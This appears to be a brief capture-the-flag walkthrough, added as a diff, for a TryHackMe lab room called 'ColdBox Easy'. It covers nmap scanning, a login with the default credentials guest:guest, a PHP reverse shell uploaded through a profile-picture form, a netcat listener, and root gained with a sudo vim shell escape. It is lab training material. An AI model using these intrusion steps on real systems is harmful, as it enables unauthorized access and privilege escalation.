@@ -1,0 +1,60 @@
+----------------                               ------------------
+               :::::::::::;| COLDBOX EASY |;::::::::::::
+
+1) FIRST WE HAVE TO ACCES THE TRYHACKME FROM OPENVPN.
+2) WE HAVE TO JOIN THE ROOM "COLDBOX EASY".
+ 
+TASK - 1 (RECON)
+
+1. SCAN THE MACHNE.
+
+    namp -Pn <ip>
+    nmap -A -T 5 <ip> -vv
+
+"it's a Linux machine".
+
+2. How many ports are open?
+ANS: 2 ports (22/SSH, 80/HTTP)
+
+3. What's on port 80?
+ANS: ColdBox CMS login page.
+
+----------TASK 1 COMPLETED----------
+
+TASK - 2 (WEB EXPLOIT)
+
+1. CHECK DEFAULT CREDS.
+
+    admin:admin
+    "NOPE! Try guest:guest"
+    "SUCCESS! Limited access."
+
+2. FIND UPLOAD VULN.
+
+    "Profile picture upload accepts .php!"
+    "Upload PHP reverse shell."
+
+----------TASK 2 COMPLETED-----------
+ 
+TASK - 3 (PRIV ESC)
+
+1. GET SHELL.
+
+    nc -lvnp 4444
+    "Trigger shell at /uploads/shell.php"
+    "WE'RE www-data!"
+
+2. CHECK SUDO.
+
+    sudo -l
+    "Can run /usr/bin/vim as root!"
+    sudo vim -c ':!/bin/sh'
+    "ROOT SHELL GET!"
+
+FLAGS:
+    cat /root/root.txt
+    cat /home/coldbox/user.txt
+
+-------------------                                                --------------------
+             -----------                                    ------------
+                  ---------- COLDBOX PWNED ----------
